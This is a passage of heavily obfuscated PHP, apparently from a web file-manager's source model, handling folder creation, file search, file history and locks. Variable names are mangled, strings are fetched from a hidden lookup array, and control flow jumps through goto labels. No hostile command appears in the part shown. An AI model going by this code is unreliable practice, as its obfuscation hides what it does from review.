$FÃÇãÓáÈ = $eÀ²ôˆ…È—[$EÏÏÖîóõª[28]]; $AÎà„òø¿µ = str_replace($EÏÏÖîóõª[50], $EÏÏÖîóõª[33], Pinyin::encode($FÃÇãÓáÈ)); if (stripos($FÃÇãÓáÈ, $B»ƒøÌ³ß­) !== !1 || stripos($AÎà„òø¿µ, $B»ƒøÌ³ß­) !== !1) { $Bƒ…ÜßÔöÚ[] = $eÀ²ôˆ…È—[$EÏÏÖîóõª[357]]; } } goto EœçÔÊ¶¹Ô; EœçÔÊ¶¹Ô: if (!$Bƒ…ÜßÔöÚ) { return; } $cÙëÆªêòà = array($EÏÏÖîóõª[1704] => array($EÏÏÖîóõª[7], $Bƒ…ÜßÔöÚ)); $fÅöŒ¯¿ = Model($EÏÏÖîóõª[1705])->field($EÏÏÖîóõª[76])->where($cÙëÆªêòà)->select(); goto eİ¶Šá÷ãù; eİ¶Šá÷ãù: $fÅöŒ¯¿ = array_to_keyvalue($fÅöŒ¯¿, $EÏÏÖîóõª[33], $EÏÏÖîóõª[76]); $f„äóÇ¶«© = array_unique($fÅöŒ¯¿); $this->_listSearchMerge($f›Ò™ß, $a‡ÄŒˆœä•, $aÁŸ®ÊŒƒ®, $f„äóÇ¶«©); goto bí·Ó»Ğ×ä; fí¾²ª¢Ê: $EÏÏÖîóõª =& $_SERVER[ÍÓÖ€°å]; if (!$a‡ÄŒˆœä•[$EÏÏÖîóõª[1604]] || $f›Ò™ß[$EÏÏÖîóõª[342]][$EÏÏÖîóõª[331]] > 1) { return; } $fšò°ÌÔŠ¹ = Model($EÏÏÖîóõª[1703])->listData(); goto A”öÖÚâñÁ; bí·Ó»Ğ×ä: } private function _listSearchDesc(&$cµ›é³œ’¢, $Dù¬ÍÒ£ã‹, $EÕÔ…»ÜˆÖ) { goto D¨ĞÆé˜¸ˆ; F½¶ºÓÌä: $Cè¤‰†–Å = array_unique($Cè¤‰†–Å); if (!$Cè¤‰†–Å) { return; } $F²¼™Â¤Ò = array($a‘ŸÖÎ·Ğ‡[365] => array($a‘ŸÖÎ·Ğ‡[7], $Cè¤‰†–Å), $a‘ŸÖÎ·Ğ‡[88] => $a‘ŸÖÎ·Ğ‡[1560], $a‘ŸÖÎ·Ğ‡[348] => array($a‘ŸÖÎ·Ğ‡[511], $a‘ŸÖÎ·Ğ‡[1606] . $Dù¬ÍÒ£ã‹[$a‘ŸÖÎ·Ğ‡[1604]] . $a‘ŸÖÎ·Ğ‡[1606])); goto b‹îêãò¶; D¨ĞÆé˜¸ˆ: $a‘ŸÖÎ·Ğ‡ =& $_SERVER[ÍÓÖ€°å]; if (!$Dù¬ÍÒ£ã‹[$a‘ŸÖÎ·Ğ‡[1604]] || $cµ›é³œ’¢[$a‘ŸÖÎ·Ğ‡[342]][$a‘ŸÖÎ·Ğ‡[331]] > 1) { return; } $Cè¤‰†–Å = $this->listSearchChildren($Dù¬ÍÒ£ã‹[$a‘ŸÖÎ·Ğ‡[375]]); goto F½¶ºÓÌä; b‹îêãò¶: $E™æÖìğä­ = Model($a‘ŸÖÎ·Ğ‡[371])->field($a‘ŸÖÎ·Ğ‡[365])->where($F²¼™Â¤Ò)->select(); $côÆ¸ÉÀ÷Ü = array_to_keyvalue($E™æÖìğä­, $a‘ŸÖÎ·Ğ‡[33], $a‘ŸÖÎ·Ğ‡[365]); $this->_listSearchMerge($cµ›é³œ’¢, $Dù¬ÍÒ£ã‹, $EÕÔ…»ÜˆÖ, $côÆ¸ÉÀ÷Ü); goto Eô¥…¨ÄØ; Eô¥…¨ÄØ: } private function _listSearchMerge(&$dìšÍòÏ·Ó, $fÚ¨¶ªİâğ, $A…Ä´éÅµ¥, $Fš‚ÀãÑ”¯) { goto B÷Òƒ…Ğ¨‰; B÷Òƒ…Ğ¨‰: $CŠ‚ÙÓ„Íô =& $_SERVER[ÍÓÖ€°å]; if (!$Fš‚ÀãÑ”¯) { return; } $bËíš¯¥ø… = array_to_keyvalue($dìšÍòÏ·Ó[$CŠ‚ÙÓ„Íô[345]], $CŠ‚ÙÓ„Íô[33], $CŠ‚ÙÓ„Íô[365]); goto aŠæïêôÎ; c‘œ¾”Ÿó: $F–ùÒù´Ì± = $this->field($A…Ä´éÅµ¥)->where($Bœİ†ã‘Üß)->select(); if (!$F–ùÒù´Ì±) { return; } $dÃ†·±Ñ§ = array(); goto aîòóçÏÇ†; aîòóçÏÇ†: foreach ($F–ùÒù´Ì± as $AÚ©”›œÖì) { $d¶“»ö‰ç¸ = $CŠ‚ÙÓ„Íô[47] . $fÚ¨¶ªİâğ[$CŠ‚ÙÓ„Íô[375]] . $CŠ‚ÙÓ„Íô[47]; if (stripos($AÚ©”›œÖì[$CŠ‚ÙÓ„Íô[364]], $d¶“»ö‰ç¸) !== !1) { $dÃ†·±Ñ§[] = $AÚ©”›œÖì; } } $dìšÍòÏ·Ó[$CŠ‚ÙÓ„Íô[345]] = array_merge($dÃ†·±Ñ§, $dìšÍòÏ·Ó[$CŠ‚ÙÓ„Íô[345]]); $dìšÍòÏ·Ó[$CŠ‚ÙÓ„Íô[342]][$CŠ‚ÙÓ„Íô[343]] += count($dÃ†·±Ñ§); goto d·½“÷‘ø ; aŠæïêôÎ: $A±æÅ÷Û£ = array_diff($Fš‚ÀãÑ”¯, $bËíš¯¥ø…); if (!$A±æÅ÷Û£) { return; } $Bœİ†ã‘Üß = array($CŠ‚ÙÓ„Íô[365] => array($CŠ‚ÙÓ„Íô[7], $A±æÅ÷Û£)); goto c‘œ¾”Ÿó; d·½“÷‘ø : } public function listSearchChildren($b½¨¯‡Ô¹„, $bß£ßš£¿© = 5000) { goto eÅšŠã›ğ; b÷¼ˆŸğ’£: $BòŞÃµ«Šô = $this->field($EÂÈŠ ±âä[365])->where($F„¸ËÃÇÀ)->select(); $dé¡Í‚ñÍŒ = array_to_keyvalue($BòŞÃµ«Šô, $EÂÈŠ ±âä[33], $EÂÈŠ ±âä[365]); return $dé¡Í‚ñÍŒ; goto c†î­‹è¡”; eÅšŠã›ğ: $EÂÈŠ ±âä =& $_SERVER[ÍÓÖ€°å]; $dé¡Í‚ñÍŒ = array(); $cõ¿Æª‰ = $this->sourceInfo($b½¨¯‡Ô¹„); goto cï ˜”˜Ë; cï ˜”˜Ë: $F„¸ËÃÇÀ = array($EÂÈŠ ±âä[364] => array($EÂÈŠ ±âä[511], $cõ¿Æª‰[$EÂÈŠ ±âä[364]] . $cõ¿Æª‰[$EÂÈŠ ±âä[365]] . $EÂÈŠ ±âä[400])); $Cˆ“Ë­åÙÎ = $this->field($EÂÈŠ ±âä[365])->where($F„¸ËÃÇÀ)->count(); if ($Cˆ“Ë­åÙÎ > $bß£ßš£¿©) { return $this->_listSearchChildrenNear($b½¨¯‡Ô¹„, $bß£ßš£¿©); } goto b÷¼ˆŸğ’£; c†î­‹è¡”: } private function _listSearchChildrenNear($fˆòÃ¶ÏŸ, $FÂ‘Âï¸±´) { goto D¥ù†ªÃß; D¥ù†ªÃß: $E§ÙÑ ˆŒ =& $_SERVER[ÍÓÖ€°å]; $e©±ÊøİÒ = array(); $b„„Ó—‚Ä = array($E§ÙÑ ˆŒ[375] => $fˆòÃ¶ÏŸ); goto Fğé…÷Ş‘; dŒÎã¹†Ì•: $e©±ÊøİÒ = array_merge($e©±ÊøİÒ, array_to_keyvalue($eî­·İÎÕ, $E§ÙÑ ˆŒ[33], $E§ÙÑ ˆŒ[365])); $e©±ÊøİÒ = array_slice($e©±ÊøİÒ, 0, $FÂ‘Âï¸±´); return $e©±ÊøİÒ; goto A¹‹æß«Ô™; Fğé…÷Ş‘: $eî­·İÎÕ = $this->field($E§ÙÑ ˆŒ[1706])->where($b„„Ó—‚Ä)->select(); $f‚—„ŒõÀØ = array_to_keyvalue(array_filter_by_field($eî­·İÎÕ, $E§ÙÑ ˆŒ[366], $E§ÙÑ ˆŒ[367]), $E§ÙÑ ˆŒ[33], $E§ÙÑ ˆŒ[365]); $e©±ÊøİÒ = array_merge($e©±ÊøİÒ, array_to_keyvalue($eî­·İÎÕ, $E§ÙÑ ˆŒ[33], $E§ÙÑ ˆŒ[365])); goto Fö¾“†‘¹; Fö¾“†‘¹: if (!$f‚—„ŒõÀØ) { return $e©±ÊøİÒ; } $b„„Ó—‚Ä = array($E§ÙÑ ˆŒ[375] => array($E§ÙÑ ˆŒ[7], $f‚—„ŒõÀØ)); $eî­·İÎÕ = $this->field($E§ÙÑ ˆŒ[1706])->where($b„„Ó—‚Ä)->select(); goto dŒÎã¹†Ì•; A¹‹æß«Ô™: } private function _listSearchBindPinyin($a„Ñ¸à¶Êî, &$dœåÅÑêé, &$dÈñ¤›°›‘) { goto dåæ‡ˆĞé¨; Dˆªí¯’Èœ: unset($dœåÅÑêé[$b¢¹–ÎéÉ±[28]]); foreach ($dœåÅÑêé as $BÛÆòõæôç => $c†â¸ñ›) { $Cˆ•®íòéÌ[$b¢¹–ÎéÉ±[1708] . $BÛÆòõæôç] = $c†â¸ñ›; } $a £¹±¯† = array($b¢¹–ÎéÉ±[399], $b¢¹–ÎéÉ±[1606] . $a„Ñ¸à¶Êî[$b¢¹–ÎéÉ±[1604]] . $b¢¹–ÎéÉ±[1606]); goto eùÚ¤š; eùÚ¤š: $Cˆ•®íòéÌ[] = array($b¢¹–ÎéÉ±[1710] => $a £¹±¯†, $b¢¹–ÎéÉ±[669] => $b¢¹–ÎéÉ±[1608], array($b¢¹–ÎéÉ±[1711] => $a £¹±¯†, $b¢¹–ÎéÉ±[1712] => array($b¢¹–ÎéÉ±[7], array($b¢¹–ÎéÉ±[395], $b¢¹–ÎéÉ±[396])))); $this->join($b…î ó‰¢); $dœåÅÑêé = $Cˆ•®íòéÌ; goto cßÆÈ®œ´; dåæ‡ˆĞé¨: $b¢¹–ÎéÉ± =& $_SERVER[ÍÓÖ€°å]; if (!Input::check($a„Ñ¸à¶Êî[$b¢¹–ÎéÉ±[1604]], $b¢¹–ÎéÉ±[298]) || strlen($a„Ñ¸à¶Êî[$b¢¹–ÎéÉ±[1604]]) < 2) { return; } $b…î ó‰¢ = "\114\105\x46\124\x20\x4a\x4f\111\116\40{$this->tablePrefix}\151\x6f\137\x73\157\165\x72\x63\x65\137\x6d\145\x74\141\40\x6d\x65\x74\x61\x20\x6f\156\x20\163\x6f\165\162\x63\145\x2e\x73\157\x75\162\x63\x65\x49\104\40\x3d\40\x6d\x65\164\x61\56\x73\157\x75\162\x63\x65\x49\104"; goto Cò§ŸØÓÄŒ; Cò§ŸØÓÄŒ: $Cˆ•®íòéÌ = array(); $dÈñ¤›°›‘ = str_replace(array($b¢¹–ÎéÉ±[212], $b¢¹–ÎéÉ±[50], $b¢¹–ÎéÉ±[1707]), $b¢¹–ÎéÉ±[33], $dÈñ¤›°›‘); $dÈñ¤›°›‘ = $b¢¹–ÎéÉ±[1708] . str_replace($b¢¹–ÎéÉ±[47], $b¢¹–ÎéÉ±[1709], $dÈñ¤›°›‘); goto Dˆªí¯’Èœ; cßÆÈ®œ´: } private function _parseSearchWhere($b†”õ°»×Ë) { goto CÛâÊ²ÉÖŸ; f¶ì“Œé¼«: if (isset($b†”õ°»×Ë[$AÓ½Î¿†ÃÉ[375]])) { $DĞÊ‹‡ãÁ£ = $this->sourceInfo($b†”õ°»×Ë[$AÓ½Î¿†ÃÉ[375]]); $FÙ¼º–—ù[$AÓ½Î¿†ÃÉ[390]] = array($AÓ½Î¿†ÃÉ[399], $DĞÊ‹‡ãÁ£[$AÓ½Î¿†ÃÉ[364]] . $b†”õ°»×Ë[$AÓ½Î¿†ÃÉ[375]] . $AÓ½Î¿†ÃÉ[400]); } if (isset($b†”õ°»×Ë[$AÓ½Î¿†ÃÉ[1604]]) && $b†”õ°»×Ë[$AÓ½Î¿†ÃÉ[1604]]) { $FÙ¼º–—ù[$AÓ½Î¿†ÃÉ[28]] = array($AÓ½Î¿†ÃÉ[399], $AÓ½Î¿†ÃÉ[1606] . $b†”õ°»×Ë[$AÓ½Î¿†ÃÉ[1604]] . $AÓ½Î¿†ÃÉ[1606]); } return $FÙ¼º–—ù; goto B×“Ö¥´°Õ; DÀÖÁğ½“İ: if (isset($b†”õ°»×Ë[$AÓ½Î¿†ÃÉ[1694]])) { $FÙ¼º–—ù[$AÓ½Î¿†ÃÉ[1694]] = $b†”õ°»×Ë[$AÓ½Î¿†ÃÉ[1694]]; } if (isset($b†”õ°»×Ë[$AÓ½Î¿†ÃÉ[1718]])) { $FÙ¼º–—ù[$AÓ½Î¿†ÃÉ[1718]] = $b†”õ°»×Ë[$AÓ½Î¿†ÃÉ[1718]]; } if (isset($b†”õ°»×Ë[$AÓ½Î¿†ÃÉ[380]])) { $d¨ø—ºÒ—Š = $b†”õ°»×Ë[$AÓ½Î¿†ÃÉ[380]]; if ($d¨ø—ºÒ—Š == $AÓ½Î¿†ÃÉ[77]) { $FÙ¼º–—ù[$AÓ½Î¿†ÃÉ[366]] = 1; } else { if ($d¨ø—ºÒ—Š == $AÓ½Î¿†ÃÉ[1719]) { $FÙ¼º–—ù[$AÓ½Î¿†ÃÉ[366]] = 0; } else { if ($d¨ø—ºÒ—Š) { $d¨ø—ºÒ—Š = is_array($d¨ø—ºÒ—Š) ? $d¨ø—ºÒ—Š : explode($AÓ½Î¿†ÃÉ[47], $d¨ø—ºÒ—Š); $FÙ¼º–—ù[$AÓ½Î¿†ÃÉ[380]] = array($AÓ½Î¿†ÃÉ[946], $d¨ø—ºÒ—Š); $FÙ¼º–—ù[$AÓ½Î¿†ÃÉ[366]] = 0; } } } } goto f¶ì“Œé¼«; CÛâÊ²ÉÖŸ: $AÓ½Î¿†ÃÉ =& $_SERVER[ÍÓÖ€°å]; $FÙ¼º–—ù = array(); if (isset($b†”õ°»×Ë[$AÓ½Î¿†ÃÉ[450]])) { $FÙ¼º–—ù[$AÓ½Î¿†ÃÉ[101]] = array($AÓ½Î¿†ÃÉ[1713], $b†”õ°»×Ë[$AÓ½Î¿†ÃÉ[450]]); } goto fä÷â¢ÑĞŞ; fä÷â¢ÑĞŞ: if (isset($b†”õ°»×Ë[$AÓ½Î¿†ÃÉ[451]])) { $D“©İ­†ÕÙ = array($AÓ½Î¿†ÃÉ[1714], $b†”õ°»×Ë[$AÓ½Î¿†ÃÉ[451]]); if ($FÙ¼º–—ù[$AÓ½Î¿†ÃÉ[101]]) { $FÙ¼º–—ù[$AÓ½Î¿†ÃÉ[101]] = array($FÙ¼º–—ù[$AÓ½Î¿†ÃÉ[101]], $D“©İ­†ÕÙ, $AÓ½Î¿†ÃÉ[1715]); } else { $FÙ¼º–—ù[$AÓ½Î¿†ÃÉ[101]] = $D“©İ­†ÕÙ; } } if (isset($b†”õ°»×Ë[$AÓ½Î¿†ÃÉ[1716]])) { $FÙ¼º–—ù[$AÓ½Î¿†ÃÉ[78]] = array($AÓ½Î¿†ÃÉ[1713], $b†”õ°»×Ë[$AÓ½Î¿†ÃÉ[1716]]); } if (isset($b†”õ°»×Ë[$AÓ½Î¿†ÃÉ[1717]])) { $D“©İ­†ÕÙ = array($AÓ½Î¿†ÃÉ[1714], $b†”õ°»×Ë[$AÓ½Î¿†ÃÉ[1717]]); if ($FÙ¼º–—ù[$AÓ½Î¿†ÃÉ[78]]) { $FÙ¼º–—ù[$AÓ½Î¿†ÃÉ[78]] = array($FÙ¼º–—ù[$AÓ½Î¿†ÃÉ[78]], $D“©İ­†ÕÙ, $AÓ½Î¿†ÃÉ[1715]); } else { $FÙ¼º–—ù[$AÓ½Î¿†ÃÉ[78]] = $D“©İ­†ÕÙ; } } goto DÀÖÁğ½“İ; B×“Ö¥´°Õ: } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($E¤µ§¼©Ù¥) { $c¶Ü¦‘‰·ã =& $_SERVER[ÍÓÖ€°å]; $bäøÅ‘‘†¨ = Model($c¶Ü¦‘‰·ã[1675])->where(array($c¶Ü¦‘‰·ã[1053] => $E¤µ§¼©Ù¥))->find(); $D˜ ÉÅ¸»Â = $this->_mkdirRoot(SourceModel::TYPE_USER, $E¤µ§¼©Ù¥, $bäøÅ‘‘†¨[$c¶Ü¦‘‰·ã[28]]); $this->userDesktopAdd($D˜ ÉÅ¸»Â); return $D˜ ÉÅ¸»Â; } public function userDesktopAdd($d×åĞİŒ‰) { $bó¹·ŠÍ»µ =& $_SERVER[ÍÓÖ€°å]; $F““àİ¬¨„ = LNG($bó¹·ŠÍ»µ[1720]); $Cƒß¼Éæš… = $this->mkdir($d×åĞİŒ‰, $F““àİ¬¨„); $this->metaSet($Cƒß¼Éæš…, $bó¹·ŠÍ»µ[1721], $bó¹·ŠÍ»µ[367]); $this->metaSet($d×åĞİŒ‰, $bó¹·ŠÍ»µ[1722], $Cƒß¼Éæš…); } public function groupRootAdd($E…ª‚ğØ³Ù) { $b‡Úˆ’ŠÉÚ =& $_SERVER[ÍÓÖ€°å]; $f¢…¡–®ß´ = Model($b‡Úˆ’ŠÉÚ[1669])->where(array($b‡Úˆ’ŠÉÚ[1598] => $E…ª‚ğØ³Ù))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $E…ª‚ğØ³Ù, $f¢…¡–®ß´[$b‡Úˆ’ŠÉÚ[28]]); } public function systemRootPathAdd($FÒÃ¸­ŒŒ¸) { if ($FÒÃ¸­ŒŒ¸ != $_SERVER[ÍÓÖ€°å][808]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $FÒÃ¸­ŒŒ¸); } public function userRootRemove($f‡ÌÍÜÃÏ) { $B‰„ºÔ­˜ø = $this->sourceRoot(SourceModel::TYPE_USER, $f‡ÌÍÜÃÏ); if (!$B‰„ºÔ­˜ø) { return; } $this->remove($B‰„ºÔ­˜ø, !1); } public function groupRootRemove($cğÇ¸Ÿ¥»›) { $dšš²ï†Ä£ = $this->sourceRoot(SourceModel::TYPE_GROUP, $cğÇ¸Ÿ¥»›); if (!$dšš²ï†Ä£) { return; } $this->remove($dšš²ï†Ä£, !1); } private function _mkdirRoot($cŸ¼ÈîÃ®å, $f¨ª“•ŒËŠ, $d’ÛÛôšŒÀ) { goto C‘‚Şéãµ; Fš¹‹Ñòµ¤: $FÑ‹ñÒ—œ£ = $this->add($CØ±ëñ´’”); $F‚ÕŒÛ‘¡¼ = array($dœîÂšçƒ[392] => short_id($FÑ‹ñÒ—œ£)); $this->where(array($dœîÂšçƒ[406] => $FÑ‹ñÒ—œ£))->save($F‚ÕŒÛ‘¡¼); goto cØ¨ÀšñÅÂ; cØ¨ÀšñÅÂ: CacheLock::unlock($bñÚœ˜‘´); return $FÑ‹ñÒ—œ£; goto aÓÙÄª‹²; C‘‚Şéãµ: $dœîÂšçƒ =& $_SERVER[ÍÓÖ€°å]; $CØ±ëñ´’” = array($dœîÂšçƒ[389] => 0, $dœîÂšçƒ[383] => $cŸ¼ÈîÃ®å, $dœîÂšçƒ[385] => $f¨ª“•ŒËŠ, $dœîÂšçƒ[377] => 1, $dœîÂšçƒ[387] => USER_ID, $dœîÂšçƒ[388] => USER_ID, $dœîÂšçƒ[379] => $dœîÂšçƒ[33], $dœîÂšçƒ[390] => $dœîÂšçƒ[1595], $dœîÂšçƒ[391] => 0, $dœîÂšçƒ[382] => 0, $dœîÂšçƒ[381] => 0, $dœîÂšçƒ[1723] => $dœîÂšçƒ[33]); if ($d§»½ˆ†â = $this->where($CØ±ëñ´’”)->find()) { return $d§»½ˆ†â[$dœîÂšçƒ[365]]; } goto A„…à¿‡; A„…à¿‡: $bñÚœ˜‘´ = $dœîÂšçƒ[1724] . $cŸ¼ÈîÃ®å . $f¨ª“•ŒËŠ . $d’ÛÛôšŒÀ; CacheLock::lock($bñÚœ˜‘´); $CØ±ëñ´’”[$dœîÂšçƒ[28]] = $d’ÛÛôšŒÀ; goto Fš¹‹Ñòµ¤; aÓÙÄª‹²: } private function sourceRoot($d¶­Çñ†¬’, $bè³§ñôò, $Cˆõ« ·Ü© = false) { $EÏùˆˆ”ì =& $_SERVER[ÍÓÖ€°å]; $eÕÇÓ»ô‹¼ = array($EÏùˆˆ”ì[389] => 0, $EÏùˆˆ”ì[383] => $d¶­Çñ†¬’, $EÏùˆˆ”ì[385] => $bè³§ñôò); if ($AçÑ£Ä®Œç = $this->where($eÕÇÓ»ô‹¼)->find()) { return $Cˆõ« ·Ü© ? $AçÑ£Ä®Œç : $AçÑ£Ä®Œç[$EÏùˆˆ”ì[365]]; } return !1; } public function sourceRootGroup($dÌ«ò×˜®Õ) { $DğßÄœ™Ş =& $_SERVER[ÍÓÖ€°å]; if (is_string($dÌ«ò×˜®Õ)) { $dÌ«ò×˜®Õ = array($dÌ«ò×˜®Õ); } $A†·–šŒë² = array($DğßÄœ™Ş[389] => 0, $DğßÄœ™Ş[383] => SourceModel::TYPE_GROUP, $DğßÄœ™Ş[385] => array($DğßÄœ™Ş[7], $dÌ«ò×˜®Õ)); $AÈŠ”ÛÉ¹‰ = $this->listSource($A†·–šŒë², 1000); return array_to_keyvalue($AÈŠ”ÛÉ¹‰[$DğßÄœ™Ş[75]], $DğßÄœ™Ş[386]); } public function mkfile($d¢¹œÈˆË¬, $cñ¤®¶ğç, $B°¡ŒŒõ³ = '', $EÛ¥¹Õ£¶ = REPEAT_RENAME) { $E‰í¸ô¾§ = Model($_SERVER[ÍÓÖ€°å][418])->addFileByContent($B°¡ŒŒõ³, $cñ¤®¶ğç); return $this->_createFileCall($d¢¹œÈˆË¬, $cñ¤®¶ğç, $E‰í¸ô¾§, $EÛ¥¹Õ£¶); } public function addFile($cµõŒÎ¿‚°, $dºÊğÕÎòá, $dË‰èñÖ•, $dëİÜîÂ‘­ = false, $f¦Öø·†á = REPEAT_RENAME) { $EÒ¯‹åù¨ = Model($_SERVER[ÍÓÖ€°å][418])->addFile($dºÊğÕÎòá, $dË‰èñÖ•, $dëİÜîÂ‘­); return $this->_createFileCall($cµõŒÎ¿‚°, $dË‰èñÖ•, $EÒ¯‹åù¨, $f¦Öø·†á); } public function addFileByFileID($C‰“ãø§‡ , $C¨¾Ä¯Ÿ¯, $B¬‹ÏÇÛÄ, $aøÙŞˆ´×Å = REPEAT_RENAME) { $AØÙÈŠÎ¹Õ =& $_SERVER[ÍÓÖ€°å]; $Bµ¯É¶Îá = Model($AØÙÈŠÎ¹Õ[418])->find($C¨¾Ä¯Ÿ¯); Model($AØÙÈŠÎ¹Õ[418])->linkAdd($C¨¾Ä¯Ÿ¯); return $this->_createFileCall($C‰“ãø§‡ , $B¬‹ÏÇÛÄ, $Bµ¯É¶Îá, $aøÙŞˆ´×Å); } public function addFileByRemote($aÊ‹Ò‹¸Œ¢, $A•›¤”ïó›, $c›×µ¢…Ää, $Aåà‹ˆá‡’ = array(), $b›±«¥Ò‚É = REPEAT_RENAME) { $e…‡Ê—ô¥Û = Model($_SERVER[ÍÓÖ€°å][418])->addFileByRemote($A•›¤”ïó›, $c›×µ¢…Ää, $Aåà‹ˆá‡’); return $this->_createFileCall($aÊ‹Ò‹¸Œ¢, $c›×µ¢…Ää, $e…‡Ê—ô¥Û, $b›±«¥Ò‚É); } private function _createFileCall($cã¯¼Ùºƒ, $A¹Œ¬´ƒæ„, $fİ…¡Í¯ë, $D¢À¾ïŞ¬–) { $eÍâ†‹ÄŠ¥ =& $_SERVER[ÍÓÖ€°å]; $C™¯…±¶Ş = !1; $eÇã¸–¹ç‡ = $this->_createFile($cã¯¼Ùºƒ, $A¹Œ¬´ƒæ„, $fİ…¡Í¯ë, $D¢À¾ïŞ¬–, $C™¯…±¶Ş); if (!$C™¯…±¶Ş) { Model($eÍâ†‹ÄŠ¥[402])->remove($fİ…¡Í¯ë[$eÍâ†‹ÄŠ¥[373]]); } return $eÇã¸–¹ç‡; } public function mkdir($bí¤ÍæòŠ, $CÂÎÔØíö®, $b©¬ê¹æÒ‚ = REPEAT_SKIP) { goto B¹İ¾½Æê˜; B¹İ¾½Æê˜: $F¥¢§ß™Î =& $_SERVER[ÍÓÖ€°å]; $c²¤ê¼ÙĞ = $this->sourceInfo($bí¤ÍæòŠ); if (!$c²¤ê¼ÙĞ) { return !1; } goto a¼í×·î‹·; a¼í×·î‹·: if ($b©¬ê¹æÒ‚ !== !1) { $BÇà½â¬ø = $this->fileNameExist($bí¤ÍæòŠ, $CÂÎÔØíö®); if ($BÇà½â¬ø && $b©¬ê¹æÒ‚ != REPEAT_RENAME_FOLDER) { return $BÇà½â¬ø; } $CÂÎÔØíö® = $this->fileNameAuto($bí¤ÍæòŠ, $CÂÎÔØíö®, $b©¬ê¹æÒ‚); } $F²»®õ„¿¿ = array($F¥¢§ß™Î[377] => 1, $F¥¢§ß™Î[378] => $CÂÎÔØíö®, $F¥¢§ß™Î[379] => $F¥¢§ß™Î[33], $F¥¢§ß™Î[381] => 0, $F¥¢§ß™Î[382] => 0); $Cãù²²Õ’› = $this->_addSoure($F²»®õ„¿¿, $c²¤ê¼ÙĞ); goto f±Ì´Ò¦Šù; f±Ì´Ò¦Šù: Model($F¥¢§ß™Î[1725])->eventCreate($Cãù²²Õ’›, $F¥¢§ß™Î[1726]); return $Cãù²²Õ’›; goto aÎÉµïÊ„¤; aÎÉµïÊ„¤: } private function _createFile($FŸ‘‹ÖÌØñ, $c¨’Ï£‡Ğ¨, $dÏêŒ¢´µ, $aÂóÖ­¬¾®, &$C¸¾ìƒã³) { goto B±òĞÆ²­; B±òĞÆ²­: $dà¨‹ƒ¯ŒÃ =& $_SERVER[ÍÓÖ€°å]; $c¹®™Í®¢æ = $this->sourceInfo($FŸ‘‹ÖÌØñ); if (!$dÏêŒ¢´µ || !$c¹®™Í®¢æ) { return !1; } goto dˆƒ¼„ğñ; dˆƒ¼„ğñ: if ($aÂóÖ­¬¾® !== !1) { $dÒß­ŒçÛì = $this->fileNameExist($FŸ‘‹ÖÌØñ, $c¨’Ï£‡Ğ¨); } $C¸¾ìƒã³ = !0; if ($aÂóÖ­¬¾® && $dÒß­ŒçÛì) { if ($aÂóÖ­¬¾® == REPEAT_SKIP) { $C¸¾ìƒã³ = !1; return $dÒß­ŒçÛì; } else { if ($aÂóÖ­¬¾® == REPEAT_REPLACE) { $c£…á«™Ï = $this->sourceInfo($dÒß­ŒçÛì); $Aå¬Õ¹æôè = $this->fileHistory($c£…á«™Ï, $dÏêŒ¢´µ[$dà¨‹ƒ¯ŒÃ[373]], $dÏêŒ¢´µ[$dà¨‹ƒ¯ŒÃ[78]]); if (!$Aå¬Õ¹æôè) { $C¸¾ìƒã³ = !1; } else { $this->folderSizeReset($FŸ‘‹ÖÌØñ); } return $dÒß­ŒçÛì; } else { $c¨’Ï£‡Ğ¨ = $this->fileNameAuto($FŸ‘‹ÖÌØñ, $c¨’Ï£‡Ğ¨, $aÂóÖ­¬¾®, !1); } } } goto F¦äÂâ£í‚; F¦äÂâ£í‚: $fËì«¡Ÿîí = array($dà¨‹ƒ¯ŒÃ[377] => 0, $dà¨‹ƒ¯ŒÃ[378] => $c¨’Ï£‡Ğ¨, $dà¨‹ƒ¯ŒÃ[379] => get_path_ext($c¨’Ï£‡Ğ¨), $dà¨‹ƒ¯ŒÃ[381] => $dÏêŒ¢´µ[$dà¨‹ƒ¯ŒÃ[373]], $dà¨‹ƒ¯ŒÃ[382] => $dÏêŒ¢´µ[$dà¨‹ƒ¯ŒÃ[78]]); $F“„ß™Şµ³ = $this->_addSoure($fËì«¡Ÿîí, $c¹®™Í®¢æ); $this->folderSizeReset($FŸ‘‹ÖÌØñ); goto F¥ª˜š‘ä; F¥ª˜š‘ä: Model($dà¨‹ƒ¯ŒÃ[1725])->eventCreate($F“„ß™Şµ³, $dà¨‹ƒ¯ŒÃ[126]); return $F“„ß™Şµ³; goto eğ‚¼öÅà¢; eğ‚¼öÅà¢: } protected function fileHistory($cÈŒÑÈ×…, $Føö‡Ü‘¾», $d¦¥Ÿ”Àƒ) { goto F£ºƒ÷º; F£ºƒ÷º: $D¨ÈçàÚö© =& $_SERVER[ÍÓÖ€°å]; if ($cÈŒÑÈ×…[$D¨ÈçàÚö©[373]] == $Føö‡Ü‘¾») { return !1; } $this->checkLock($cÈŒÑÈ×…[$D¨ÈçàÚö©[365]]); goto DÙ²–ä‰²Ø; Bé¦Û˜÷Ñ: return !0; goto Fèå¶§à¡µ; DÙ²–ä‰²Ø: Model($D¨ÈçàÚö©[1586])->addHistory($cÈŒÑÈ×…); $a¢ß²ÓÂÌ = array($D¨ÈçàÚö©[388] => USER_ID, $D¨ÈçàÚö©[1727] => time(), $D¨ÈçàÚö©[373] => $Føö‡Ü‘¾», $D¨ÈçàÚö©[78] => $d¦¥Ÿ”Àƒ); $this->where(array($D¨ÈçàÚö©[406] => $cÈŒÑÈ×…[$D¨ÈçàÚö©[365]]))->save($a¢ß²ÓÂÌ); goto Bé¦Û˜÷Ñ; Fèå¶§à¡µ: } public function checkLock($FÔøâ‹ëæé) { $déÂÆšø–Î =& $_SERVER[ÍÓÖ€°å]; $fê›íîê‹ = $this->pathInfo($FÔøâ‹ëæé); if (!$this->fileIsLock($fê›íîê‹)) { return; } $c¾¾˜¯ëˆ¿ = $fê›íîê‹[$déÂÆšø–Î[1562]][$déÂÆšø–Î[1728]]; $e ä÷šª = $c¾¾˜¯ëˆ¿[$déÂÆšø–Î[1729]] ? $c¾¾˜¯ëˆ¿[$déÂÆšø–Î[1729]] : $c¾¾˜¯ëˆ¿[$déÂÆšø–Î[28]]; show_json(LNG($déÂÆšø–Î[1730]) . $déÂÆšø–Î[1731] . LNG($déÂÆšø–Î[1732]) . $déÂÆšø–Î[1733] . $e ä÷šª . $déÂÆšø–Î[1734], !1); } public function fileIsLock($Eš¤ƒùùİê) { $fƒã¥¨° =& $_SERVER[ÍÓÖ€°å]; if 